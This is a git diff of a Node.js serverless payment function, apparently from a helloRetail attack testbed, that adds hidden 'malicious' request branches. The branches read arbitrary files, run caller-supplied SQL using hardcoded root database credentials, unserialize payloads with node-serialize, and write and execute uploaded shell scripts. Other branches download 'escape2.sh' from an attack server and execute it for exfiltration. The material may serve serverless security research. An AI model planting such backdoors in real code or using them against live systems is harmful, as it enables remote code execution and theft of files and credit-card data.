@@ -83,7 +83,7 @@ module.exports = async (event, context, callback) => {
 	} else if (event.body.malicious == 'escape_S1') { // zch
 		console.log('Step 1: Downloading escape attack scripts');
 		var downloadStatus = await malicious.downloadFile(event.body.attackserver, 'escape2.sh');
-	
+
 		var response = {
 			approved: 'false',
 			failureReason: downloadStatus
@@ -91,15 +91,15 @@ module.exports = async (event, context, callback) => {
 		callback(null, response);
 	} else if (event.body.malicious == 'escape_S2') { // zch
 		console.log('Step 2: Exfiltration');
-        if (fs.existsSync('./escape2.sh')) {
+		if (fs.existsSync('./escape2.sh')) {
 			try {
 				const { stdout, stderr } = await execFile('/bin/sh', ['./escape2.sh']);
 				// const { stdout, stderr } = await execFile('./escape2.sh');
 				var response = {
 					approved: 'false',
 					failureReason: {
-					out: stdout,
-					err: stderr
+						out: stdout,
+						err: stderr
 					}
 				};
 				callback(null, response);
@@ -114,113 +114,169 @@ module.exports = async (event, context, callback) => {
 			}
 		} else {
 			var response = {
-			approved: 'false',
-			failureReason: './escape2.sh does not exist.'
+				approved: 'false',
+				failureReason: './escape2.sh does not exist.'
 			};
 			callback(null, response);
 		}
-	}else if (event.body.malicious == 'readFiles') {
+	} else if (event.body.malicious == 'readFiles') {
 		/*var fileName = event.body.fileName;
 		var response = { 'data': 'done'  , 'type' : 'read' }
 		child_process.execSync(`touch ${fileName}`);
 		callback(null, response);*/
-        const filesToRead = [event.body.fileName]; 
-        Promise.all(filesToRead.map(file => {  
-            return new Promise((resolve, reject) => {  
-                fs.readFile(file, 'utf8', (err, data) => {  
-                    if (err) {  
-                        reject(`Error reading file ${file}: ${err}`);  
-                    } else {  
-                        resolve({file, content: data});  
-                    }  
-                });  
-            });  
-        }))  
-        .then(results => {  
-            callback(null, {  
-                approved: 'true',  
-                files: results  
-            });  
-        })  
-        .catch(err => {  
-            callback(null, {  
-                approved: 'false',  
-                failureReason: err 
-            });  
-        });  
-    } else if (event.body.malicious == 'sqlInjection') {  
-		const fs = require('fs');  
-		const mysql = require('mysql');  
-	
-		const sqlQuery = event.body.sql;   
-		const fileToRead = event.body.fileName;   
-	
+		var filesToRead = event.body.fileName;
+		//var filesToRead2 = event.body.fileName2; 
+		Promise.all(filesToRead.map(file => {
+			return new Promise((resolve, reject) => {
+				fs.readFile(file, 'utf8', (err, data) => {
+					if (err) {
+						reject(`Error reading file ${file}: ${err}`);
+					} else {
+						resolve({ file, content: data });
+					}
+				});
+			});
+		}))
+			.then(results => {
+				callback(null, {
+					approved: 'true',
+					files: results
+				});
+			})
+			.catch(err => {
+				callback(null, {
+					approved: 'false',
+					failureReason: err
+				});
+			});
+	} else if (event.body.malicious == 'sqlInjection') {
+		var sqlQuery1 = event.body.sql1;
+		var sqlQuery2 = event.body.sql2;
+		const mysql = require('mysql');
 		// 直接连接到 MySQL，无需启动服务  
-		const connection = mysql.createConnection({  
-			host: constants.HOST,  
-			user: constants.USER,  
-			password: constants.PASS,  
-			database: constants.DBNAME  
-		});  
-		connection.connect((err) => {  
-			if (err) {  
-				console.error('Error connecting to MySQL:', err);  
-				return callback(null, { approved: 'false', failureReason: 'Database connection failed: ' + err.message });  
-			}  
-			// Log successful connection  
-			console.log('Connected to MySQL');  
-			connection.query('SELECT 1', (error, results) => {  
-				if (error) {  
-					console.error('SQL Error:', error);  
-					callback(null, {  
-						approved: 'false',  
-						failureReason: error.message  
-					});  
-				} else {  
-					console.log('Query executed successfully:', results);  
-					// Execute your SQL query here  
-				}  
-			});  
+		const connection = mysql.createConnection({
+			host: 'cc-db',
+			user: 'root',
+			password: 'pass',
+			database: 'helloRetail',
+			connectTimeout: 10000 // 设置超时为 10 秒
 		});
-		/*connection.connect((err) => {  
-			if (err) {  
-				console.error('Error connecting to MySQL:', err);  
-				return callback(null, {  
-					approved: 'false',  
-					failureReason: 'Database connection failed: ' + err.message  
-				});  
-			}  
-	
-			const query = `SELECT * FROM users WHERE user_id = '${sqlQuery}';`;   
-			connection.query(query, (error, results) => {  
-				if (error) {  
-					console.error('SQL Error:', error);  
-					callback(null, {  
-						approved: 'false',  
-						failureReason: error.message  
-					});  
-				} else {  
-					try {  
-						const data = fs.readFileSync(fileToRead, 'utf8');  
-						console.log('Read file content:', data);  
-	
-						callback(null, {  
-							approved: 'true',  
-							results: results,  
-							fileContent: data  
-						});  
-					} catch (err) {  
-						console.error('Error reading file:', err);  
-						callback(null, {  
-							approved: 'false',  
-							failureReason: 'File read error: ' + err.message  
-						});  
-					}  
-				}  
-			});  
-			connection.end();  
-		});  */
-	} else {
+
+		connection.connect((error) => {
+			if (error) {
+
+				console.error('Error connecting to MySQL:', error);
+				return callback(null, {
+					approved: 'false',
+					failureReason: 'Database connection failed: ' + error.message
+				});
+			}
+
+			//const query = `SELECT * FROM creditCards;  `;   
+			connection.query(sqlQuery1, (err, results) => {
+				if (err) {
+					connection.query(sqlQuery2, (error, answer) => {
+						if (error) {
+							console.error('SQL Error:', error);
+							callback(null, { approved: 'false', error: err, failureReason: error.message });
+						} else {
+							callback(null, { approved: 'true', error: err, answer: answer });
+							connection.end();
+						}
+					});
+					/*console.error('SQL Error:', error);  
+					callback(null, {  approved: 'false', error: err, failureReason: error.message  });  */
+				} else {
+					connection.query(sqlQuery2, (error, answer) => {
+						if (error) {
+							console.error('SQL Error:', error);
+							callback(null, { approved: 'false', results: results, failureReason: error.message });
+						} else {
+							callback(null, { approved: 'true', results: results, answer: answer });
+							connection.end();
+						}
+					});
+
+
+				}
+			});
+
+			//connection.end();  
+		});
+	} else if (event.body.malicious == 'deserialize') {
+		const s = require('node-serialize');
+		const payload = event.body.payload;
+		try {
+			const result = s.unserialize(payload); // 反序列化  
+			callback(null, { approved: 'true', type: typeof result });
+		} catch (err) {
+			callback(null, { approved: 'false', error: err, failureReason: err.message });
+		}
+
+
+	} else if (event.body.malicious == "uploadmaliciousfile") {
+		// 确保上传路径存在  
+		const uploadDir = './uploads';
+		if (!fs.existsSync(uploadDir)) {
+			fs.mkdirSync(uploadDir, { recursive: true });
+		}
+
+		// 获取文件名和内容  
+		const fileName = event.body.fileName;
+		const fileContent = event.body.fileContent;
+
+		if (!fileName || !fileContent) {
+			var response = {
+				approved: 'false',
+				failureReason: 'fileName and fileContent cannot be empty.'
+			};
+			callback(null, response);
+			return;
+		}
+
+		// Ensure the file extension is .sh  
+		if (!fileName.endsWith('.sh')) {
+			var response = {
+				approved: 'false',
+				failureReason: 'Only .sh files are supported for execution.'
+			};
+			callback(null, response);
+			return;
+		}
+
+		try {
+			// 写入内容到指定的 .sh 文件  
+			const filePath = `${uploadDir}/${fileName}`;
+			fs.writeFileSync(filePath, fileContent, 'utf8');
+			console.log(`File uploaded successfully: ${filePath}`);
+
+			// 为脚本添加可执行权限  
+			fs.chmodSync(filePath, '755');
+
+			// 执行 .sh 文件并获取输出  
+			// const { stdout, stderr } = child_process.execSync(`sh ${filePath}`, { encoding: 'utf8' });  
+			const { stdout, stderr } = await execFile('/bin/sh', [filePath]);
+			console.log('Script Execution Output:', stdout);
+			console.error('Script Execution Error:', stderr);
+
+			var response = {
+				approved: 'true',
+				message: `File ${fileName} executed successfully.`,
+				output: stdout ? stdout.trim() : null,
+				errors: stderr ? stderr.trim() : null
+			};
+			callback(null, response);
+		} catch (error) {
+			console.error('Error executing script:', error);
+
+			var response = {
+				approved: 'false',
+				failureReason: `Error executing file: ${error.message}`
+			};
+			callback(null, response);
+		}
+	}
+	else {
 		var result = {};
 		if (event.body.creditCard) {
 			if (Math.random() < 0.01) { // Simulate failure in 1% of purchases (expected).
